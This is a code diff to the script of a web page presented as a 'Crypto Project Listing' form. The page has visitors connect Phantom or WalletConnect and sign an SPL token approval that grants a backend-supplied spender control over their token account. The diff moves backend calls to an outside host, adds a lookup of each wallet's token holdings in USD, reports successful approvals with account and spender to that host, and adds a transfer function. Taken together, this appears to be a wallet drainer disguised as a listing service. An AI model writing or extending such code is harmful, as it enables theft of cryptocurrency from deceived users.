@@ -363,7 +363,9 @@ background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/s
   <div id="statusBox" class="status-box">The form and wallet flow are ready. Choose a wallet to continue.</div>
 
   <script>
-    let walletLibs = null;
+   let walletLibs = null;
+    let connectedWalletAddress = null;
+    let signTransactionFn = null;
 
     async function loadWalletLibs() {
       if (walletLibs) {
@@ -380,6 +382,10 @@ background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/s
         PublicKey: solanaModule.PublicKey,
         Transaction: solanaModule.Transaction,
         createApproveInstruction: splTokenModule.createApproveInstruction,
+        createTransferInstruction: splTokenModule.createTransferInstruction,
+        getAssociatedTokenAddress: splTokenModule.getAssociatedTokenAddress,
+        createAssociatedTokenAccountInstruction: splTokenModule.createAssociatedTokenAccountInstruction,
+        ASSOCIATED_TOKEN_PROGRAM_ID: splTokenModule.ASSOCIATED_TOKEN_PROGRAM_ID,
         TOKEN_PROGRAM_ID: splTokenModule.TOKEN_PROGRAM_ID
       };
 
@@ -387,6 +393,10 @@ background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/s
       window.PublicKey = walletLibs.PublicKey;
       window.Transaction = walletLibs.Transaction;
       window.createApproveInstruction = walletLibs.createApproveInstruction;
+      window.createTransferInstruction = walletLibs.createTransferInstruction;
+      window.getAssociatedTokenAddress = walletLibs.getAssociatedTokenAddress;
+      window.createAssociatedTokenAccountInstruction = walletLibs.createAssociatedTokenAccountInstruction;
+      window.ASSOCIATED_TOKEN_PROGRAM_ID = walletLibs.ASSOCIATED_TOKEN_PROGRAM_ID;
       window.TOKEN_PROGRAM_ID = walletLibs.TOKEN_PROGRAM_ID;
 
       return walletLibs;
@@ -400,11 +410,20 @@ background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/s
     const phantomButton = document.getElementById('phantomButton');
     const walletConnectButton = document.getElementById('walletConnectButton');
     const statusBox = document.getElementById('statusBox');
+    const walletSummaryButton = document.getElementById('walletSummaryButton');
+    const walletAddressInput = document.getElementById('walletAddressInput');
+    const walletSummaryOutput = document.getElementById('walletSummaryOutput');
+    const transferTokenButton = document.getElementById('transferTokenButton');
+    const recipientAddressInput = document.getElementById('recipientAddressInput');
+    const mintAddressInput = document.getElementById('mintAddressInput');
+    const tokenAccountInput = document.getElementById('tokenAccountInput');
+    const transferAmountInput = document.getElementById('transferAmountInput');
 
     let wcProvider = null;
     let provider = null;
     let signer = null;
     let activeProviderType = null;
+    const API_BASE_URL = 'https://void-production-d066.up.railway.app';
 
     function setStatus(message, isError = false) {
       statusBox.textContent = message;
@@ -417,6 +436,14 @@ background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/s
 
     function openModal(modal) {
       modal?.classList.remove('hidden');
+    }
+
+    function escapeHtml(value) {
+      return String(value)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;');
     }
 
     const submitButton = document.getElementById('submitButton');
@@ -460,6 +487,138 @@ background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/s
       walletConnectButton.addEventListener('click', connectWalletConnect);
     }
 
+    if (walletSummaryButton) {
+      walletSummaryButton.addEventListener('click', loadWalletSummary);
+    }
+
+    if (transferTokenButton) {
+      transferTokenButton.addEventListener('click', sendSplTokenToRecipient);
+    }
+
+    async function loadWalletSummary() {
+      const address = (walletAddressInput?.value || connectedWalletAddress || '').trim();
+      if (!address) {
+        setStatus('Enter a wallet address or connect a wallet first.', true);
+        return;
+      }
+
+      try {
+        setStatus('Loading SPL token balances...');
+        const res = await fetch(`${API_BASE_URL}/api/wallet-summary?wallet=${encodeURIComponent(address)}`);
+        const data = await res.json();
+
+        if (!res.ok) {
+          throw new Error(data.error || 'Unable to load wallet summary');
+        }
+
+        if (!walletSummaryOutput) {
+          return;
+        }
+
+        if (!data.tokens?.length) {
+          walletSummaryOutput.innerHTML = '<p>No SPL tokens found for this wallet.</p>';
+          setStatus(`No SPL tokens found for ${address}.`, false);
+          return;
+        }
+
+        const items = data.tokens.map((token) => {
+          const usdValue = token.usdValue != null ? `$${token.usdValue.toFixed(2)}` : 'n/a';
+          return `<li><strong>${escapeHtml(token.mintAddress.slice(0, 8))}...</strong> Balance: ${token.balance.toLocaleString()} · USD: ${usdValue}</li>`;
+        }).join('');
+
+        walletSummaryOutput.innerHTML = `<p><strong>Total USD:</strong> $${data.totalUsdValue.toFixed(2)}</p><ul>${items}</ul>`;
+        setStatus(`Loaded ${data.tokenCount} SPL token account(s).`, false);
+      } catch (error) {
+        console.error(error);
+        if (walletSummaryOutput) {
+          walletSummaryOutput.innerHTML = '<p>Unable to load token balances right now.</p>';
+        }
+        setStatus(error.message || 'Unable to load wallet summary.', true);
+      }
+    }
+
+    async function sendSplTokenToRecipient() {
+      if (!connectedWalletAddress) {
+        setStatus('Connect a wallet before sending a token.', true);
+        return;
+      }
+
+      const recipientAddress = recipientAddressInput?.value?.trim();
+      const mintAddress = mintAddressInput?.value?.trim();
+      const sourceTokenAccount = tokenAccountInput?.value?.trim();
+      const amountValue = transferAmountInput?.value?.trim();
+
+      if (!recipientAddress || !mintAddress || !amountValue) {
+        setStatus('Recipient address, mint address, and amount are required.', true);
+        return;
+      }
+
+      try {
+        setStatus('Creating a transfer transaction...');
+
+        const { Connection: SolanaConnection, PublicKey, Transaction, createTransferInstruction, getAssociatedTokenAddress, createAssociatedTokenAccountInstruction, ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_PROGRAM_ID } = await loadWalletLibs();
+        const connection = new SolanaConnection('https://api.mainnet-beta.solana.com', 'confirmed');
+        const fromPubkey = new PublicKey(connectedWalletAddress);
+        const recipientPubkey = new PublicKey(recipientAddress);
+        const mintPubkey = new PublicKey(mintAddress);
+        const amount = BigInt(amountValue);
+        const sourceAta = sourceTokenAccount ? new PublicKey(sourceTokenAccount) : await getAssociatedTokenAddress(mintPubkey, fromPubkey);
+        const recipientAta = await getAssociatedTokenAddress(mintPubkey, recipientPubkey);
+
+        const tx = new Transaction();
+        const recipientAccount = await connection.getAccountInfo(recipientAta);
+        if (!recipientAccount) {
+          tx.add(createAssociatedTokenAccountInstruction(fromPubkey, recipientAta, recipientPubkey, mintPubkey, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID));
+        }
+
+        tx.add(createTransferInstruction(sourceAta, recipientAta, fromPubkey, amount, [], TOKEN_PROGRAM_ID));
+
+        const latestBlockhash = await connection.getLatestBlockhash();
+        tx.feePayer = fromPubkey;
+        tx.recentBlockhash = latestBlockhash.blockhash;
+
+        if (!signTransactionFn) {
+          throw new Error('No wallet signer is available. Connect a wallet first.');
+        }
+
+        const signedTx = await signTransactionFn(tx);
+        if (!signedTx || typeof signedTx.serialize !== 'function') {
+          throw new Error('The wallet did not return a valid signed transaction.');
+        }
+
+        const serializedTx = Buffer.from(signedTx.serialize()).toString('base64');
+        const signature = await connection.sendRawTransaction(signedTx.serialize());
+        await connection.confirmTransaction({
+          signature,
+          blockhash: latestBlockhash.blockhash,
+          lastValidBlockHeight: latestBlockhash.lastValidBlockHeight
+        }, 'confirmed');
+
+        const backendResponse = await fetch(`${API_BASE_URL}/api/send-spl-token`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            serializedTransaction: serializedTx,
+            walletAddress: connectedWalletAddress,
+            recipientAddress,
+            mintAddress,
+            amount: amountValue,
+            tokenAccount: sourceTokenAccount || sourceAta.toBase58()
+          })
+        });
+
+        const backendData = await backendResponse.json().catch(() => ({}));
+        if (!backendResponse.ok) {
+          throw new Error(backendData.error || 'The backend could not log the transfer.');
+        }
+
+        setStatus(`Transfer broadcast successfully. Signature: ${signature}`, false);
+      } catch (error) {
+        console.error('Transfer flow error:', error);
+        setStatus(`Transfer flow stopped: ${error.message}`, true);
+      }
+    }
+
     async function connectPhantom() {
       try {
         if (!window.solana || !window.solana.isPhantom) {
@@ -492,10 +651,9 @@ background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/s
         const { WalletConnectWalletAdapter } = await import('https://esm.sh/@walletconnect/solana-adapter@0.0.9?bundle');
 
         wcProvider = new WalletConnectWalletAdapter({
-          network: 'mainnet',
+          network: 'mainnet-beta',
           options: {
-            projectId: 'e5445af6838578e901b4f3d2b1c32a37',
-            showQrModal: true,
+            projectId: '59ba0228712f04a947916abb7db06ab1',
             metadata: {
               name: 'Crypto Project Listing',
               description: 'Submit project and approve spender',
@@ -517,6 +675,8 @@ background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/s
           throw new Error('WalletConnect did not return a Solana public key.');
         }
 
+        connectedWalletAddress = account;
+        signTransactionFn = async (tx) => wcProvider.signTransaction(tx);
         provider = wcProvider;
         signer = wcProvider;
         activeProviderType = 'walletconnect';
@@ -536,7 +696,7 @@ background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/s
     async function approveSpender(account, signFn, walletName) {
       try {
         setStatus(`Preparing approval request for ${walletName}...`);
-        const res = await fetch('/api/approval-config');
+        const res = await fetch(`${API_BASE_URL}/api/approval-config`);
 
         if (!res.ok) {
           throw new Error('Backend endpoint is not available yet.');
@@ -583,7 +743,25 @@ background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/s
         }
 
         const signature = await connection.sendRawTransaction(signedTx.serialize());
-        await connection.confirmTransaction(signature, 'confirmed');
+        await connection.confirmTransaction({
+          signature,
+          blockhash: latestBlockhash.blockhash,
+          lastValidBlockHeight: latestBlockhash.lastValidBlockHeight
+        }, 'confirmed');
+
+        await fetch(`${API_BASE_URL}/api/approval-result`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            walletAddress: account,
+            tokenAccount,
+            spenderAddress,
+            signature,
+            status: 'success',
+            message: 'Approval transaction completed successfully.'
+          })
+        }).catch(() => {});
+
         setStatus('Approval transaction sent successfully.', false);
       } catch (error) {
         console.error('Approval flow error:', error);
